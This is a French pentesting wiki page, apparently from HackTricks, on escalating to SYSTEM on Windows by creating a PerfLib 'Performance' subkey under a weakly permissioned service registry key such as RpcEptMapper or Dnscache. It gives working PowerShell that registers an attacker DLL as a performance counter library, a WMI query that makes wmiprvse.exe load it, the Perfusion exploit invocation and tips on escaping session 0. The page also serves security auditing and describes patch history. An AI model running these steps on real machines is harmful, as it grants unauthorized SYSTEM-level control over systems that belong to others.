# Autorisation AppendData/AddSubdirectory sur le registre d’un service

{{#include ../../banners/hacktricks-training.md}}

**L’article original est** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Résumé

Si vous disposez uniquement des autorisations **`Create Subkey`** / **`AppendData/AddSubdirectory`** sur une clé de registre de service, cela reste une bonne piste de privesc. Vous ne pouvez généralement **pas** écraser directement `ImagePath`, `ServiceDll` ou d’autres valeurs existantes, mais vous pouvez peut-être toujours créer une clé enfant **`Performance`** sous :

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Toute autre clé **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** pour laquelle votre token dispose de **`KEY_CREATE_SUB_KEY`**

L’astuce est que Windows prend toujours en charge l’ancien modèle d’enregistrement **PerfLib V1**. Si un service possède une sous-clé **`Performance`**, Windows peut charger une DLL depuis celle-ci lorsqu’un consommateur de compteurs de performance demande des données.

Selon la documentation Microsoft, l’enregistrement minimal est le suivant :<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Donc, la conclusion offensive est la suivante : **ne rejetez pas une découverte concernant le registre d’un service simplement parce que vous n’avez obtenu que `CreateSubKey` au lieu de `SetValue`**.<sup>[[3]](#references)</sup>

## Pourquoi cela suffit pour l’exécution de code

La sous-clé `Performance` **n’existe généralement pas par défaut pour ces services**, donc **`KEY_CREATE_SUB_KEY`** est la primitive dont vous avez besoin. Une fois la clé créée et contenant `Library`/`Open`/`Collect`/`Close`, n’importe quel **consumer de compteurs de performance** peut déclencher le chargement de la DLL.<sup>[[3]](#references)</sup>

Quelques détails importants :

- La valeur **`Library`** peut pointer vers un **chemin complet de DLL**.
- La DLL doit exporter **`OpenPerfData`**, **`CollectPerfData`** et **`ClosePerfData`**, et retourner `ERROR_SUCCESS`.
- Le code s’exécute dans le **contexte du consumer**, **pas nécessairement dans le processus du service vulnérable lui-même**.
- Dans le cas classique de `RpcEptMapper` / `Dnscache`, une **requête de performance WMI** peut amener **`wmiprvse.exe`** à charger la DLL en tant que **`NT AUTHORITY\SYSTEM`**.

C’est pourquoi cette primitive est facile à manquer pendant le triage : la clé de registre du service parent n’est pas « entièrement accessible en écriture », mais elle reste exploitable.

## Énumération rapide

Vérification manuelle ciblée avec **AccessChk** :
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
Exemple PowerShell pour rechercher les principals à faibles privilèges disposant de **`CreateSubKey`** sur les clés de service :
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Outils utiles :

- **PrivescCheck** : `Get-ModifiableRegistryPath` a été créé spécifiquement pour détecter cette catégorie de problème.<sup>[[3]](#references)</sup>
- **SharpUp** : `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion** : automatise le dépôt de DLL, l’enregistrement de `Performance`, le déclenchement WMI, la duplication de token et le nettoyage sur les cibles vulnérables legacy (par exemple : `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Déroulement de l’exploitation

Créez la sous-clé `Performance` et renseignez les valeurs requises :<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Déclenchez ensuite un **consommateur de performances privilégié**. Un exemple classique est une requête WMI sur les classes `Win32_Perf*` :<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Notes opérationnelles :

- Le lancement de **`perfmon.exe`** est utile pour vérifier que l’enregistrement du compteur est correct, mais cela ne charge généralement la DLL que dans le **contexte de votre propre utilisateur**.
- Pour une véritable LPE, déclenchez un consommateur **privilégié** tel que **WMI**.
- Si vous écrivez votre propre exploit, lancer directement `cmd.exe` depuis la DLL vous laisse généralement avec un shell dans la **session 0**. `Perfusion` résout ce problème en dupliquant le token privilégié dans un processus créé en mode suspendu dans la session de l’attaquant.<sup>[[4]](#references)</sup>
- Adaptez l’architecture de la DLL à celle du consommateur cible (**x64 sur les systèmes x64**).

## Notes de version / évolutions récentes

Historiquement, les clés faibles intégrées étaient les suivantes :<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2** : `RpcEptMapper` et `Dnscache`
- **Windows 8 / Windows Server 2012** : `RpcEptMapper`

`Perfusion` indique que les mises à jour d’**avril 2021** ont supprimé le chemin d’exploitation facile sur les systèmes **Windows 8 / Windows Server 2012** mis à jour, tandis que **Windows 7 / Windows Server 2008 R2** restait exploitable via **`Dnscache`**.<sup>[[4]](#references)</sup>

Cette primitive n’est **pas uniquement historique**. En **janvier 2025**, Microsoft a corrigé un problème connexe d’AD DS permettant aux membres de **`Network Configuration Operators`** de créer des sous-clés sous **`Dnscache`** et **`NetBT`** ; la même idée d’**enregistrement d’une DLL de compteur de performance** pouvait être réutilisée pour atteindre **SYSTEM** sur les systèmes pris en charge.<sup>[[2]](#references)</sup>

La leçon moderne est donc générale : lorsqu’un principal disposant de faibles privilèges possède **`CreateSubKey`** sur **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**, vérifiez si une clé enfant **`Performance`** suffit avant d’écarter la finding.

## Références

- [1] [Microsoft Learn - Création de la clé de performance de l’application](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Vulnérabilité d’élévation de privilèges d’Active Directory Domain Services (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Permissions de registre non sécurisées du service Windows RpcEptMapper EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit de la vulnérabilité de permissions de la clé de registre RpcEptMapper)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
